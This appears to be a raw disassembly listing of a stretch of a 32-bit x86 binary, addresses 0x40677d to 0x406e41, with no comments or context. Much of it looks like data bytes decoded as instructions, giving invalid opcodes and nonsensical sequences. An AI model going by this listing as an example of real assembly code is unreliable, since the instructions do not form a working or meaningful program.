  40677d:	add    dh,BYTE PTR [edi+0x0]
  406780:	outs   dx,DWORD PTR ds:[esi]
  406781:	cmp    al,0x0
  406783:	add    BYTE PTR [eax],al
  406785:	add    BYTE PTR [ebx+0x7c133708],al
  40678b:	add    dh,BYTE PTR [edi+0x0]
  40678e:	cwde   
  40678f:	cmp    al,0x0
  406791:	add    BYTE PTR [eax],al
  406793:	add    dh,ah
  406795:	add    DWORD PTR [esi+0x13],eax
  406798:	les    eax,FWORD PTR [ebx]
  40679a:	ja     0x40679c
  40679c:	sar    BYTE PTR [eax+eax*1],0x0
  4067a0:	add    BYTE PTR [eax],al
  4067a2:	xchg   BYTE PTR [eax],bl
  4067a4:	add    DWORD PTR [esi],eax
  4067a6:	rol    DWORD PTR [ebx],1
  4067a8:	js     0x4067aa
  4067aa:	sub    BYTE PTR ds:0x0,bh
  4067b0:	xchg   BYTE PTR [eax],cl
  4067b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067b3:	adc    edi,DWORD PTR [edx+eax*1-0x80]
  4067b7:	add    BYTE PTR [eax],dh
  4067b9:	cmp    eax,0x0
  4067be:	xchg   BYTE PTR [eax],cl
  4067c0:	mov    dl,0x13
  4067c2:	mov    al,BYTE PTR [edx]
  4067c4:	add    BYTE PTR [eax],0x38
  4067c7:	cmp    eax,0x0
  4067cc:	xchg   BYTE PTR [eax],cl
  4067ce:	mov    esp,0x8003e213
  4067d3:	add    BYTE PTR [eax+0x3d],al
  4067d6:	add    BYTE PTR [eax],al
  4067d8:	add    BYTE PTR [eax],al
  4067da:	xchg   BYTE PTR [eax],cl
  4067dc:	int    0x13
  4067de:	jl     0x4067e2
  4067e0:	add    BYTE PTR [eax],0x48
  4067e3:	cmp    eax,0x0
  4067e8:	xchg   BYTE PTR [eax],cl
  4067ea:	fcom   QWORD PTR [ebx]
  4067ec:	jl     0x4067f0
  4067ee:	add    BYTE PTR [eax],0x50
  4067f1:	cmp    eax,0x0
  4067f6:	xchg   BYTE PTR [eax],cl
  4067f8:	and    BYTE PTR [ebx],dl
  4067fa:	jl     0x4067fe
  4067fc:	add    BYTE PTR [eax],0x58
  4067ff:	cmp    eax,0x0
  406804:	xchg   BYTE PTR [eax],cl
  406806:	pop    esp
  406807:	adc    eax,0x80028a
  40680c:	pusha  
  40680d:	cmp    eax,0x0
  406812:	xchg   BYTE PTR [eax],cl
  406814:	jo     0x40682b
  406816:	mov    es,WORD PTR [edx]
  406818:	add    BYTE PTR [eax],0x6c
  40681b:	cmp    eax,0x0
  406820:	xchg   BYTE PTR [eax],bl
  406822:	add    DWORD PTR [esi],eax
  406824:	cmp    eax,DWORD PTR [eax]
  406826:	add    DWORD PTR [eax],0x3dac
  40682c:	add    BYTE PTR [eax],al
  40682e:	xchg   BYTE PTR [eax],al
  406830:	test   BYTE PTR ds:0x81003b,dl
  406836:	in     al,dx
  406837:	cmp    eax,0x0
  40683c:	out    0x1,al
  40683e:	sahf   
  40683f:	adc    eax,0x81003b
  406844:	cld    
  406845:	cmp    eax,0x0
  40684a:	test   BYTE PTR [eax],al
  40684c:	sahf   
  40684d:	adc    eax,0x81028e
  406852:	in     al,dx
  406853:	add    BYTE PTR ds:[eax],al
  406856:	add    BYTE PTR [eax],al
  406858:	out    0x1,al
  40685a:	repz or edx,DWORD PTR [eax]
  40685d:	add    al,0x82
  40685f:	add    al,al
  406861:	inc    eax
  406862:	add    BYTE PTR [eax],al
  406864:	add    BYTE PTR [eax],al
  406866:	out    0x1,al
  406868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406869:	adc    eax,0x8b028a
  40686e:	add    al,0x41
  406870:	add    BYTE PTR [eax],al
  406872:	add    BYTE PTR [eax],al
  406874:	out    0x1,al
  406876:	mov    ah,0x15
  406878:	mov    al,BYTE PTR [edx]
  40687a:	mov    eax,DWORD PTR [eax]
  40687c:	dec    eax
  40687d:	inc    ecx
  40687e:	add    BYTE PTR [eax],al
  406880:	add    BYTE PTR [eax],al
  406882:	out    0x1,al
  406884:	les    edx,FWORD PTR ds:0x8b027c
  40688a:	nop
  40688b:	inc    ecx
  40688c:	add    BYTE PTR [eax],al
  40688e:	add    BYTE PTR [eax],al
  406890:	out    0x1,al
  406892:	jmp    0x4068a9
  406894:	sbb    eax,0xd8008b04
  406899:	inc    edx
  40689a:	add    BYTE PTR [eax],al
  40689c:	add    BYTE PTR [eax],al
  40689e:	out    0x1,al
  4068a0:	pop    es
  4068a1:	push   ss
  4068a2:	xor    BYTE PTR [ecx+edx*4],al
  4068a5:	add    BYTE PTR [ebx+eax*2+0x0],bl
  4068a9:	add    BYTE PTR [eax],al
  4068ab:	add    dh,ah
  4068ad:	add    DWORD PTR [esi],ebp
  4068af:	push   ss
  4068b0:	cmp    al,0x4
  4068b2:	xchg   ebp,eax
  4068b3:	add    BYTE PTR [esp+eax*2+0x0],dh
  4068ba:	out    0x1,al
  4068bc:	cmp    edx,DWORD PTR [esi]
  4068be:	dec    ecx
  4068bf:	add    al,0x99
  4068c1:	add    BYTE PTR [eax+0x45],al
  4068c4:	add    BYTE PTR [eax],al
  4068c6:	add    BYTE PTR [eax],al
  4068c8:	out    0x1,al
  4068ca:	pop    ecx
  4068cb:	push   ss
  4068cc:	pusha  
  4068cd:	add    ebx,DWORD PTR [edx+0x45a800]
  4068d3:	add    BYTE PTR [eax],al
  4068d5:	add    dh,ah
  4068d7:	add    DWORD PTR [ebx+0x16],esi
  4068da:	imul   eax,DWORD PTR [ebx],0xffffff9a
  4068dd:	add    BYTE PTR [eax],dl
  4068df:	inc    esi
  4068e0:	add    BYTE PTR [eax],al
  4068e2:	add    BYTE PTR [eax],al
  4068e4:	out    0x1,al
  4068e6:	adc    BYTE PTR [esi],0x4f
  4068e9:	add    al,0x9b
  4068eb:	add    BYTE PTR [esi+eax*2+0x0],bh
  4068ef:	add    BYTE PTR [eax],al
  4068f1:	add    dh,ah
  4068f3:	add    DWORD PTR [ecx-0x62fbb0ea],ebx
  4068f9:	add    al,ch
  4068fb:	inc    esi
  4068fc:	add    BYTE PTR [eax],al
  4068fe:	add    BYTE PTR [eax],al
  406900:	out    0x1,al
  406902:	rcl    DWORD PTR [esi],1
  406904:	push   esi
  406905:	add    al,0x9f
  406907:	add    BYTE PTR [eax],ah
  406909:	dec    eax
  40690a:	add    BYTE PTR [eax],al
  40690c:	add    BYTE PTR [eax],al
  40690e:	out    0x1,al
  406910:	out    0x16,eax
  406912:	pop    edi
  406913:	add    al,0xa0
  406915:	add    BYTE PTR [eax],dl
  406917:	dec    ecx
  406918:	add    BYTE PTR [eax],al
  40691a:	add    BYTE PTR [eax],al
  40691c:	add    DWORD PTR [eax],0x46716f7
  406922:	mov    ds:0x4a4400,eax
  406927:	add    BYTE PTR [eax],al
  406929:	add    dh,ah
  40692b:	add    DWORD PTR [edi],ecx
  40692d:	pop    ss
  40692e:	mov    es,WORD PTR [edx]
  406930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406931:	add    BYTE PTR [edi+0x4a],cl
  406934:	add    BYTE PTR [eax],al
  406936:	add    BYTE PTR [eax],al
  406938:	out    0x1,al
  40693a:	and    eax,0xa601a517
  40693f:	add    BYTE PTR [edx+0x4a],bl
  406942:	add    BYTE PTR [eax],al
  406944:	add    BYTE PTR [eax],al
  406946:	out    0x1,al
  406948:	xor    DWORD PTR [edi],edx
  40694a:	cmp    eax,DWORD PTR [eax]
  40694c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40694d:	add    BYTE PTR [edx+ecx*2+0x0],bl
  406951:	add    BYTE PTR [eax],al
  406953:	add    dh,ah
  406955:	add    DWORD PTR [edx],edi
  406957:	pop    ss
  406958:	cmp    eax,DWORD PTR [eax]
  40695a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40695b:	add    BYTE PTR [eax+0x4a],ch
  40695e:	add    BYTE PTR [eax],al
  406960:	add    BYTE PTR [eax],al
  406962:	add    DWORD PTR [eax],0x470174e
  406968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406969:	add    BYTE PTR [eax],ch
  40696b:	dec    esp
  40696c:	add    BYTE PTR [eax],al
  40696e:	add    BYTE PTR [eax],al
  406970:	add    DWORD PTR [eax],0x477175f
  406976:	test   al,0x0
  406978:	mov    ah,0x4d
  40697a:	add    BYTE PTR [eax],al
  40697c:	add    BYTE PTR [eax],al
  40697e:	add    DWORD PTR [eax],0x3b176c
  406984:	stos   DWORD PTR es:[edi],eax
  406985:	add    BYTE PTR [eax],al
  406987:	dec    esi
  406988:	add    BYTE PTR [eax],al
  40698a:	add    BYTE PTR [eax],al
  40698c:	add    DWORD PTR [eax],0x47e179e
  406992:	stos   DWORD PTR es:[edi],eax
  406993:	add    BYTE PTR [esi+ecx*2+0x0],ch
  406997:	add    BYTE PTR [eax],al
  406999:	add    BYTE PTR [ecx-0x79e82f00],al
  40699f:	add    al,0xad
  4069a1:	add    BYTE PTR [esi+ecx*2+0x0],bh
  4069a8:	add    DWORD PTR [eax],0x48617e5
  4069ae:	scas   eax,DWORD PTR es:[edi]
  4069af:	add    ah,dh
  4069b1:	dec    esi
  4069b2:	add    BYTE PTR [eax],al
  4069b4:	add    BYTE PTR [eax],al
  4069b6:	xchg   BYTE PTR [eax],bl
  4069b8:	add    DWORD PTR [esi],eax
  4069ba:	xchg   ebx,eax
  4069bb:	add    al,0xb1
  4069bd:	add    BYTE PTR [edi+ecx*2],al
  4069c0:	add    BYTE PTR [eax],al
  4069c2:	add    BYTE PTR [eax],al
  4069c4:	mov    BYTE PTR [eax],0x9b
  4069c7:	movntps XMMWORD PTR [ebx],xmm0
  4069ca:	mov    dl,0x0
  4069cc:	test   BYTE PTR [edi+0x0],cl
  4069cf:	add    BYTE PTR [eax],al
  4069d1:	add    BYTE PTR [esi-0x65e82f00],al
  4069d7:	add    al,0xb2
  4069d9:	add    al,bl
  4069db:	dec    edi
  4069dc:	add    BYTE PTR [eax],al
  4069de:	add    BYTE PTR [eax],al
  4069e0:	xchg   BYTE PTR [eax],al
  4069e2:	in     eax,0x17
  4069e4:	call   0x50:0x1800b304
  4069eb:	add    BYTE PTR [eax],al
  4069ed:	add    BYTE PTR [esi+0x3b179e00],al
  4069f3:	add    BYTE PTR [eax+eax*1+0x5070],dh
  4069fa:	add    BYTE PTR [eax],al
  4069fc:	xchg   BYTE PTR [eax],al
  4069fe:	jge    0x406a18
  406a00:	mov    eax,ds:0xf400b404
  406a05:	push   eax
  406a06:	add    BYTE PTR [eax],al
  406a08:	add    BYTE PTR [eax],al
  406a0a:	xchg   BYTE PTR [eax],al
  406a0c:	xchg   esp,eax
  406a0d:	sbb    BYTE PTR [ebp+0x5000bb01],ah
  406a13:	push   ecx
  406a14:	add    BYTE PTR [eax],al
  406a16:	add    BYTE PTR [eax],al
  406a18:	xchg   BYTE PTR [eax],al
  406a1a:	lods   eax,DWORD PTR ds:[esi]
  406a1b:	sbb    ah,ch
  406a1d:	add    bh,BYTE PTR [eax+eax*1+0x51b8]
  406a24:	add    BYTE PTR [eax],al
  406a26:	xchg   BYTE PTR [eax],al
  406a28:	fcomp  DWORD PTR [eax]
  406a2a:	scas   al,BYTE PTR es:[edi]
  406a2b:	add    al,0xbd
  406a2d:	add    BYTE PTR [eax],ah
  406a2f:	push   edx
  406a30:	add    BYTE PTR [eax],al
  406a32:	add    BYTE PTR [eax],al
  406a34:	xchg   BYTE PTR [eax],al
  406a36:	out    dx,eax
  406a37:	sbb    ah,ch
  406a39:	add    bh,BYTE PTR [esi+0x528c00]
  406a3f:	add    BYTE PTR [eax],al
  406a41:	add    BYTE PTR [esi-0x4ae6e900],al
  406a47:	add    al,0xbf
  406a49:	add    ah,dl
  406a4b:	push   edx
  406a4c:	add    BYTE PTR [eax],al
  406a4e:	add    BYTE PTR [eax],al
  406a50:	add    DWORD PTR [eax],0x4c4192c
  406a56:	rol    DWORD PTR [eax],0xc
  406a59:	push   ebx
  406a5a:	add    BYTE PTR [eax],al
  406a5c:	add    BYTE PTR [eax],al
  406a5e:	add    DWORD PTR [eax],0x4c4193d
  406a64:	ret    0xb00
  406a67:	push   eax
  406a68:	add    BYTE PTR [eax],al
  406a6a:	add    BYTE PTR [eax],al
  406a6c:	add    DWORD PTR [eax],0x3b34bb
  406a72:	ret    
  406a73:	add    BYTE PTR [edx],ah
  406a75:	push   ebx
  406a76:	add    BYTE PTR [eax],al
  406a78:	add    BYTE PTR [eax],al
  406a7a:	mov    BYTE PTR [eax],0x9b
  406a7d:	movntps XMMWORD PTR [ebx],xmm0
  406a80:	ret    
  406a81:	add    BYTE PTR ds:0x53,ah
  406a87:	add    cl,ah
  406a89:	add    DWORD PTR [ebp-0x3cfd71f1],esi
  406a8f:	add    BYTE PTR [eax],dh
  406a91:	push   ebx
  406a92:	add    BYTE PTR [eax],al
  406a94:	add    BYTE PTR [eax],al
  406a96:	xchg   BYTE PTR [eax],al
  406a98:	dec    esi
  406a99:	sbb    DWORD PTR [ecx+0x4a00c401],edx
  406a9f:	push   ebx
  406aa0:	add    BYTE PTR [eax],al
  406aa2:	add    BYTE PTR [eax],al
  406aa4:	xchg   BYTE PTR [eax],bl
  406aa6:	add    DWORD PTR [esi],eax
  406aa8:	cmp    eax,DWORD PTR [eax]
  406aaa:	lds    eax,FWORD PTR [eax]
  406aac:	push   edx
  406aad:	push   ebx
  406aae:	add    BYTE PTR [eax],al
  406ab0:	add    BYTE PTR [eax],al
  406ab2:	xchg   BYTE PTR [eax],bl
  406ab4:	add    DWORD PTR [esi],eax
  406ab6:	xchg   ecx,eax
  406ab7:	add    ebp,eax
  406ab9:	add    BYTE PTR [ecx+0x53],ah
  406abc:	add    BYTE PTR [eax],al
  406abe:	add    BYTE PTR [eax],al
  406ac0:	mov    BYTE PTR [eax],0x9b
  406ac3:	movntps XMMWORD PTR [ebx],xmm0
  406ac6:	mov    BYTE PTR [eax],0x6c
  406ac9:	push   ebx
  406aca:	add    BYTE PTR [eax],al
  406acc:	add    BYTE PTR [eax],al
  406ace:	les    eax,FWORD PTR [eax]
  406ad0:	repz or edi,DWORD PTR [ebx]
  406ad3:	add    dh,al
  406ad5:	add    ah,cl
  406ad7:	push   ebx
  406ad8:	add    BYTE PTR [eax],al
  406ada:	add    BYTE PTR [eax],al
  406adc:	add    DWORD PTR [eax],0x4d01996
  406ae2:	mov    BYTE PTR [eax],0x60
  406ae5:	push   esp
  406ae6:	add    BYTE PTR [eax],al
  406ae8:	add    BYTE PTR [eax],al
  406aea:	add    DWORD PTR [eax],0x4da19a8
  406af0:	enter  0xc000,0x54
  406af4:	add    BYTE PTR [eax],al
  406af6:	add    BYTE PTR [eax],al
  406af8:	xchg   ecx,eax
  406af9:	add    ch,al
  406afb:	sbb    eax,esp
  406afd:	add    al,0xc9
  406aff:	add    al,bh
  406b01:	push   esp
  406b02:	add    BYTE PTR [eax],al
  406b04:	add    BYTE PTR [eax],al
  406b06:	mov    BYTE PTR [eax],0xd6
  406b09:	sbb    DWORD PTR [ebx+0x3],ebp
  406b0c:	retf   0x2000
  406b0f:	push   ebp
  406b10:	add    BYTE PTR [eax],al
  406b12:	add    BYTE PTR [eax],al
  406b14:	mov    BYTE PTR [eax],0xe1
  406b17:	sbb    DWORD PTR [ebx+0x3],ebp
  406b1a:	retf   
  406b1b:	add    BYTE PTR [eax+0x55],cl
  406b1e:	add    BYTE PTR [eax],al
  406b20:	add    BYTE PTR [eax],al
  406b22:	mov    BYTE PTR [eax],0xf1
  406b25:	sbb    edi,esp
  406b27:	add    al,0xcc
  406b29:	add    BYTE PTR [ebp+edx*2+0x0],ah
  406b30:	mov    BYTE PTR [eax],0xf9
  406b33:	sbb    ebp,ebp
  406b35:	add    al,0xcd
  406b37:	add    al,ah
  406b39:	push   ebp
  406b3a:	add    BYTE PTR [eax],al
  406b3c:	add    BYTE PTR [eax],al
  406b3e:	mov    BYTE PTR [eax],0x6
  406b41:	sbb    bl,ah
  406b43:	add    cl,dh
  406b45:	add    bh,dh
  406b47:	push   ebp
  406b48:	add    BYTE PTR [eax],al
  406b4a:	add    BYTE PTR [eax],al
  406b4c:	sbb    DWORD PTR [eax],0x1
  406b4f:	push   es
  406b50:	clc    
  406b51:	add    al,0xd0
  406b53:	add    BYTE PTR [ebx],dl
  406b55:	push   esi
  406b56:	add    BYTE PTR [eax],al
  406b58:	add    BYTE PTR [eax],al
  406b5a:	(bad)  
  406b5b:	or     BYTE PTR [edi],ch
  406b5d:	sbb    bh,BYTE PTR [edx+eax*1-0x2e]
  406b61:	add    BYTE PTR [eax],ah
  406b63:	push   esi
  406b64:	add    BYTE PTR [eax],al
  406b66:	add    BYTE PTR [eax],al
  406b68:	mov    BYTE PTR [eax],0x49
  406b6b:	sbb    al,BYTE PTR [ecx]
  406b6d:	add    eax,0x564a00d2
  406b72:	add    BYTE PTR [eax],al
  406b74:	add    BYTE PTR [eax],al
  406b76:	sbb    DWORD PTR [eax],0x1
  406b79:	push   es
  406b7a:	clc    
  406b7b:	add    al,0xd2
  406b7d:	add    BYTE PTR [esi+0x56],ah
  406b80:	add    BYTE PTR [eax],al
  406b82:	add    BYTE PTR [eax],al
  406b84:	(bad)  
  406b85:	or     BYTE PTR [edi],ch
  406b87:	sbb    bh,BYTE PTR [edx+eax*1-0x2c]
  406b8b:	add    BYTE PTR [esi+edx*2+0x0],dh
  406b8f:	add    BYTE PTR [eax],al
  406b91:	add    dh,al
  406b93:	or     BYTE PTR [edi+0x1a],bl
  406b96:	pop    es
  406b97:	add    eax,0x56f000d4
  406b9c:	add    BYTE PTR [eax],al
  406b9e:	add    BYTE PTR [eax],al
  406ba0:	(bad)  
  406ba1:	or     BYTE PTR [edi+0x1a],ch
  406ba4:	pop    es
  406ba5:	add    eax,0x576c00d4
  406baa:	add    BYTE PTR [eax],al
  406bac:	add    BYTE PTR [eax],al
  406bae:	(bad)  
  406baf:	or     BYTE PTR [ecx+0x1a],bh
  406bb2:	pop    es
  406bb3:	add    eax,0x4f6300d4
  406bb8:	add    BYTE PTR [eax],al
  406bba:	add    BYTE PTR [eax],al
  406bbc:	xchg   BYTE PTR [eax],bl
  406bbe:	add    DWORD PTR [esi],eax
  406bc0:	cmp    eax,DWORD PTR [eax]
  406bc2:	aam    0x0
  406bc4:	imul   ecx,DWORD PTR [edi+0x0],0x0
  406bc8:	add    BYTE PTR [eax],al
  406bca:	xchg   BYTE PTR [eax],al
  406bcc:	je     0x406c02
  406bce:	cmp    eax,DWORD PTR [eax]
  406bd0:	aam    0x0
  406bd2:	mov    bh,0x4f
  406bd4:	add    BYTE PTR [eax],al
  406bd6:	add    BYTE PTR [eax],al
  406bd8:	xchg   BYTE PTR [eax],bl
  406bda:	add    DWORD PTR [esi],eax
  406bdc:	cmp    eax,DWORD PTR [eax]
  406bde:	aam    0x0
  406be0:	mov    edi,0x4f
  406be5:	add    BYTE PTR [esi+0x3b34a100],al
  406beb:	add    ah,dl
  406bed:	add    BYTE PTR [eax+edx*2],ch
  406bf0:	add    BYTE PTR [eax],al
  406bf2:	add    BYTE PTR [eax],al
  406bf4:	xchg   BYTE PTR [eax],bl
  406bf6:	add    DWORD PTR [esi],eax
  406bf8:	cmp    eax,DWORD PTR [eax]
  406bfa:	aam    0x0
  406bfc:	xor    al,0x50
  406bfe:	add    BYTE PTR [eax],al
  406c00:	add    BYTE PTR [eax],al
  406c02:	xchg   BYTE PTR [eax],al
  406c04:	out    0x34,eax
  406c06:	cmp    eax,DWORD PTR [eax]
  406c08:	aam    0x0
  406c0a:	rcl    DWORD PTR [eax+0x0],1
  406c0d:	add    BYTE PTR [eax],al
  406c0f:	add    BYTE PTR [esi+0x3b060118],al
  406c15:	add    ah,dl
  406c17:	add    cl,bl
  406c19:	push   eax
  406c1a:	add    BYTE PTR [eax],al
  406c1c:	add    BYTE PTR [eax],al
  406c1e:	xchg   BYTE PTR [eax],al
  406c20:	pop    ss
  406c21:	xor    eax,0xd4003b
  406c26:	daa    
  406c27:	push   ecx
  406c28:	add    BYTE PTR [eax],al
  406c2a:	add    BYTE PTR [eax],al
  406c2c:	xchg   BYTE PTR [eax],bl
  406c2e:	add    DWORD PTR [esi],eax
  406c30:	cmp    eax,DWORD PTR [eax]
  406c32:	aam    0x0
  406c34:	das    
  406c35:	push   ecx
  406c36:	add    BYTE PTR [eax],al
  406c38:	add    BYTE PTR [eax],al
  406c3a:	xchg   BYTE PTR [eax],al
  406c3c:	dec    ecx
  406c3d:	xor    eax,0xd4003b
  406c42:	nop
  406c43:	push   ecx
  406c44:	add    BYTE PTR [eax],al
  406c46:	add    BYTE PTR [eax],al
  406c48:	xchg   BYTE PTR [eax],bl
  406c4a:	add    DWORD PTR [esi],eax
  406c4c:	cmp    eax,DWORD PTR [eax]
  406c4e:	aam    0x0
  406c50:	cwde   
  406c51:	push   ecx
  406c52:	add    BYTE PTR [eax],al
  406c54:	add    BYTE PTR [eax],al
  406c56:	xchg   BYTE PTR [eax],al
  406c58:	mov    dh,BYTE PTR ds:0xd4003b
  406c5e:	clc    
  406c5f:	push   ecx
  406c60:	add    BYTE PTR [eax],al
  406c62:	add    BYTE PTR [eax],al
  406c64:	xchg   BYTE PTR [eax],bl
  406c66:	add    DWORD PTR [esi],eax
  406c68:	cmp    eax,DWORD PTR [eax]
  406c6a:	aam    0x0
  406c6c:	add    BYTE PTR [edx+0x0],dl
  406c6f:	add    BYTE PTR [eax],al
  406c71:	add    BYTE PTR [esi+0x3b35c900],al
  406c77:	add    ah,dl
  406c79:	add    BYTE PTR [eax+0x52],ah
  406c7c:	add    BYTE PTR [eax],al
  406c7e:	add    BYTE PTR [eax],al
  406c80:	xchg   BYTE PTR [eax],bl
  406c82:	add    DWORD PTR [esi],eax
  406c84:	cmp    eax,DWORD PTR [eax]
  406c86:	aam    0x0
  406c88:	push   0x52
  406c8d:	add    BYTE PTR [esi+0x3b360000],al
  406c93:	add    ah,dl
  406c95:	add    BYTE PTR [eax],al
  406c97:	add    BYTE PTR [ecx],al
  406c99:	add    BYTE PTR [ecx+0x100001a],ah
  406c9f:	add    BYTE PTR [edi+0x100001a],ah
  406ca5:	add    BYTE PTR [edx+ebx*1+0x20000],ch
  406cac:	mov    ah,0x1a
  406cae:	add    BYTE PTR [eax],al
  406cb0:	add    eax,DWORD PTR [eax]
  406cb2:	leave  
  406cb3:	sbb    al,BYTE PTR [eax]
  406cb5:	add    BYTE PTR [ecx],al
  406cb7:	add    BYTE PTR [edx+0x20],cl
  406cba:	add    BYTE PTR [eax],al
  406cbc:	add    al,BYTE PTR [eax]
  406cbe:	jo     0x406ce3
  406cc0:	add    BYTE PTR [eax],al
  406cc2:	add    DWORD PTR [eax],eax
  406cc4:	rcr    DWORD PTR [edx],1
  406cc6:	add    BYTE PTR [eax],al
  406cc8:	add    DWORD PTR [eax],eax
  406cca:	loop   0x406ce6
  406ccc:	add    BYTE PTR [eax],al
  406cce:	add    al,BYTE PTR [eax]
  406cd0:	repnz sbb al,BYTE PTR [eax]
  406cd3:	add    BYTE PTR [ecx],al
  406cd5:	add    dl,ah
  406cd7:	sbb    al,BYTE PTR [eax]
  406cd9:	add    BYTE PTR [ecx],al
  406cdb:	add    dl,ah
  406cdd:	sbb    al,BYTE PTR [eax]
  406cdf:	add    BYTE PTR [edx],al
  406ce1:	add    dl,bh
  406ce3:	sbb    al,BYTE PTR [eax]
  406ce5:	add    BYTE PTR [ecx],al
  406ce7:	add    BYTE PTR [ebx],al
  406ce9:	sbb    eax,DWORD PTR [eax]
  406ceb:	add    BYTE PTR [edx],al
  406ced:	add    BYTE PTR [ebx+ebx*1],cl
  406cf0:	add    BYTE PTR [eax],al
  406cf2:	add    DWORD PTR [eax],eax
  406cf4:	add    ebx,DWORD PTR [ebx]
  406cf6:	add    BYTE PTR [eax],al
  406cf8:	add    al,BYTE PTR [eax]
  406cfa:	push   ds
  406cfb:	sbb    eax,DWORD PTR [eax]
  406cfd:	add    BYTE PTR [ecx],al
  406cff:	add    BYTE PTR [ebx],al
  406d01:	sbb    eax,DWORD PTR [eax]
  406d03:	add    BYTE PTR [edx],al
  406d05:	add    BYTE PTR [ebx+ebx*1],ch
  406d08:	add    BYTE PTR [eax],al
  406d0a:	add    DWORD PTR [eax],eax
  406d0c:	add    ebx,DWORD PTR [ebx]
  406d0e:	add    BYTE PTR [eax],al
  406d10:	add    DWORD PTR [eax],eax
  406d12:	add    ebx,DWORD PTR [ebx]
  406d14:	add    BYTE PTR [eax],al
  406d16:	add    al,BYTE PTR [eax]
  406d18:	sub    al,0x1b
  406d1a:	add    BYTE PTR [eax],al
  406d1c:	add    DWORD PTR [eax],eax
  406d1e:	aas    
  406d1f:	sbb    eax,DWORD PTR [eax]
  406d21:	add    BYTE PTR [edx],al
  406d23:	add    BYTE PTR [edi+0x1b],al
  406d26:	add    BYTE PTR [eax],al
  406d28:	add    eax,DWORD PTR [eax]
  406d2a:	loop   0x406d46
  406d2c:	add    BYTE PTR [eax],al
  406d2e:	add    DWORD PTR [eax],eax
  406d30:	add    ebx,DWORD PTR [ebx]
  406d32:	add    BYTE PTR [eax],al
  406d34:	add    al,BYTE PTR [eax]
  406d36:	or     al,0x1b
  406d38:	add    BYTE PTR [eax],al
  406d3a:	add    DWORD PTR [eax],eax
  406d3c:	add    ebx,DWORD PTR [ebx]
  406d3e:	add    BYTE PTR [eax],al
  406d40:	add    al,BYTE PTR [eax]
  406d42:	push   ds
  406d43:	sbb    eax,DWORD PTR [eax]
  406d45:	add    BYTE PTR [ecx],al
  406d47:	add    BYTE PTR [ebx],al
  406d49:	sbb    eax,DWORD PTR [eax]
  406d4b:	add    BYTE PTR [ecx],al
  406d4d:	add    BYTE PTR [edi+0x1b],cl
  406d50:	add    BYTE PTR [eax],al
  406d52:	add    al,BYTE PTR [eax]
  406d54:	push   ebp
  406d55:	sbb    eax,DWORD PTR [eax]
  406d57:	add    BYTE PTR [ecx],al
  406d59:	add    BYTE PTR [esi+0x1b],ah
  406d5c:	add    BYTE PTR [eax],al
  406d5e:	add    al,BYTE PTR [eax]
  406d60:	push   0x1b
  406d62:	add    BYTE PTR [eax],al
  406d64:	add    DWORD PTR [eax],eax
  406d66:	jae    0x406d83
  406d68:	add    BYTE PTR [eax],al
  406d6a:	add    DWORD PTR [eax],eax
  406d6c:	test   BYTE PTR [ebx],bl
  406d6e:	add    BYTE PTR [eax],al
  406d70:	add    DWORD PTR [eax],eax
  406d72:	xchg   edi,eax
  406d73:	sbb    eax,DWORD PTR [eax]
  406d75:	add    BYTE PTR [ecx],al
  406d77:	add    BYTE PTR [edi+0x100001b],dl
  406d7d:	add    dl,dh
  406d7f:	sbb    al,BYTE PTR [eax]
  406d81:	add    BYTE PTR [ecx],al
  406d83:	add    BYTE PTR [edi+0x100001b],dl
  406d89:	add    BYTE PTR [ebp+0x100001b],bl
  406d8f:	add    BYTE PTR [edi+0x200001b],bl
  406d95:	add    dl,dh
  406d97:	sbb    al,BYTE PTR [eax]
  406d99:	add    BYTE PTR [ecx],al
  406d9b:	add    BYTE PTR [ebx+0x100001b],ch
  406da1:	add    dl,al
  406da3:	sbb    eax,DWORD PTR [eax]
  406da5:	add    BYTE PTR [ecx],al
  406da7:	add    dl,al
  406da9:	sbb    eax,DWORD PTR [eax]
  406dab:	add    BYTE PTR [ecx],al
  406dad:	add    bh,dl
  406daf:	sbb    eax,DWORD PTR [eax]
  406db1:	add    BYTE PTR [edx],al
  406db3:	add    bl,ch
  406db5:	sbb    eax,DWORD PTR [eax]
  406db7:	add    BYTE PTR [ecx],al
  406db9:	add    cl,bh
  406dbb:	sbb    eax,DWORD PTR [eax]
  406dbd:	add    BYTE PTR [edx],al
  406dbf:	add    BYTE PTR [edi],cl
  406dc1:	sbb    al,0x0
  406dc3:	add    BYTE PTR [ebx],al
  406dc5:	add    bl,ch
  406dc7:	sbb    eax,DWORD PTR [eax]
  406dc9:	add    BYTE PTR [ecx],al
  406dcb:	add    cl,bh
  406dcd:	sbb    eax,DWORD PTR [eax]
  406dcf:	add    BYTE PTR [ecx],al
  406dd1:	add    BYTE PTR [ecx],ah
  406dd3:	sbb    al,0x0
  406dd5:	add    BYTE PTR [ecx],al
  406dd7:	add    BYTE PTR [ecx+0x100001a],ah
  406ddd:	add    BYTE PTR [ecx+0x100001a],ah
  406de3:	add    BYTE PTR [ecx+0x100001a],ah
  406de9:	add    BYTE PTR [ebx+0x200001b],ch
  406def:	add    BYTE PTR [edi],ah
  406df1:	sbb    al,0x0
  406df3:	add    BYTE PTR [ebx],al
  406df5:	add    BYTE PTR ds:0x100001c,dh
  406dfb:	add    BYTE PTR [eax+0x1c],al
  406dfe:	add    BYTE PTR [eax],al
  406e00:	add    DWORD PTR [eax],eax
  406e02:	push   ecx
  406e03:	sbb    al,0x0
  406e05:	add    BYTE PTR [ecx],al
  406e07:	add    BYTE PTR [ebp+0x1c],bl
  406e0a:	add    BYTE PTR [eax],al
  406e0c:	add    al,BYTE PTR [eax]
  406e0e:	jns    0x406e2c
  406e10:	add    BYTE PTR [eax],al
  406e12:	add    eax,DWORD PTR [eax]
  406e14:	(bad)  
  406e15:	sbb    al,0x0
  406e17:	add    BYTE PTR [ecx],al
  406e19:	add    BYTE PTR [edi+0x100021c],bl
  406e1f:	add    BYTE PTR [edx+0x100001c],dh
  406e25:	add    al,dh
  406e27:	sbb    al,0x0
  406e29:	add    BYTE PTR [edx],al
  406e2b:	add    BYTE PTR [ecx],al
  406e2d:	sbb    eax,0x30000
  406e32:	push   ss
  406e33:	sbb    eax,0x40002
  406e38:	das    
  406e39:	sbb    eax,0x10000
  406e3e:	lock sbb al,0x0
  406e41:	add    BYTE PTR [edx],al
